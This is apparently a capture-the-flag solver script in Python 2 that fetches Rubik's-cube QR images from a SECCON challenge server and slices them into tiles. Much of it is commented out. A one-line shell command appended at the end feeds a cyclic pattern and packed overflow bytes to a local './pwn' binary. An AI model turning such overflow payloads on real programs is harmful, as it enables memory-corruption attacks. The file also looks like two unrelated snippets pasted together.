import qrtools
import urllib2
from PIL import Image
import random
base="http://qubicrube.pwn.seccon.jp:33654/images/"
arr=["B","U","R","D","F","L"]
end="_B.png"
count1=0
lis=[]
gay=[]
count=0
middle="04c0348a6aeca46e33af"
while True:
	end="_"+arr[count1]+".png"
	print end
	ye = urllib2.urlopen(base+middle+end)
	qr = qrtools.QR()
	re=open(str(count)+".png","wb")
	re.write(ye.read())
	re.close()
	im=Image.open(str(count)+".png")
	rows=[]
	rag=im.getdata()
	one,two,three,four,five,six,seven,eight,nine=[],[],[],[],[],[],[],[],[]
	for i in range(len(rag)):
		if i<82*246 and i%246<82:
			one.append(rag[i])
		elif  i<82*246 and i%246>=82 and i%246<82*2:
			two.append(rag[i])
		elif i<82*246 and i%246>=82*2:
			three.append(rag[i])
		elif i>=82*246 and i<2*82*246 and i%246<82:
			four.append(rag[i])
		elif i>=82*246 and i<2*82*246 and i%246>=82 and i%246<82*2:
			five.append(rag[i])
		elif i>=82*246 and i<2*82*246 and i%246>=82*2:
			six.append(rag[i])
		elif i>=2*82*246 and i%246<82:
			seven.append(rag[i])
		elif i>=2*82*246 and i%246>=82 and i%246<82*2:
			eight.append(rag[i])
		elif i>=2*82*246 and i%246>=82*2:
			nine.append(rag[i])
	if (0xff,0xd5,0) in one:
		im2 = Image.new("RGB",(82,82))
		im2.putdata(one)
		im2.save(str(random.randint(1,100000))+".png")
	if (0xff,0xd5,0) in two:
		im2 = Image.new("RGB",(82,82))
		im2.putdata(two)
		im2.save(str(random.randint(1,100000))+".png")
	if (0xff,0xd5,0) in three:
		im2 = Image.new("RGB",(82,82))
		im2.putdata(three)
		im2.save(str(random.randint(1,100000))+".png")
	if (0xff,0xd5,0) in four:
		im2 = Image.new("RGB",(82,82))
		im2.putdata(four)
		im2.save(str(random.randint(1,100000))+".png")
	if (0xff,0xd5,0) in five:
		im2 = Image.new("RGB",(82,82))
		im2.putdata(five)
		im2.save(str(random.randint(1,100000))+".png")
	if (0xff,0xd5,0) in six:
		im2 = Image.new("RGB",(82,82))
		im2.putdata(six)
		im2.save(str(random.randint(1,100000))+".png")
	if (0xff,0xd5,0) in seven:
		im2 = Image.new("RGB",(82,82))
		im2.putdata(seven)
		im2.save(str(random.randint(1,100000))+".png")
	if (0xff,0xd5,0) in eight:
		im2 = Image.new("RGB",(82,82))
		im2.putdata(eight)
		im2.save(str(random.randint(1,100000))+".png")
	if (0xff,0xd5,0) in nine:
		im2 = Image.new("RGB",(82,82))
		im2.putdata(nine)
		im2.save(str(random.randint(1,100000))+".png")
	'''if count1==0:
		for k in range(246*246):
			lis.append((0,0,0))
	for j in range(246):
		if rag[j]==(0xff,0xd5,0):
			rows.append(j)
	print rows
	if len(rows)==82:
		gay=[]
		for i in range(246):
			temp = []
			for j in range(246):
				temp.append(rag[246*i+j])
			gay.append(temp)
		feg=zip(*gay[::-1])
		gay=zip(*feg[::-1])
		rag=[]
		rows=[]
		for l in gay:
			for poo in range(246):
				rag.append(l[poo])
		for j in range(246):
			if rag[j]==(0xff,0xd5,0):
				rows.append(j)
		im2 = Image.new("RGB",(246,246))
		im2.putdata(rag)
		im2.save("test1.png")
		
	for i in range(len(rag)):
		if i%246 in rows:
			if rag[i]==(0,0,0):	
				pass
			else:
				lis[i]=rag[i]
		if i==(0,0,0):	
			lis.append(i)
		else:
			lis.append((255,255,255))
	im.close()
	im2 = Image.new("RGB",(246,246))
	im2.putdata(lis)
	im2.save(str(count)+".png")
	qr.decode(str(count)+".png")'''
	'''
	if qr.data != "NULL":
		lis=[]
		print qr.data
		middle= qr.data[qr.data.index("33654")+6:]
		print middle
		count+=1
		count1=0
	else:'''
	count1+=1
(python -c 'print "d\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\x60\x1b\x04\x20\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"') | ./pwn
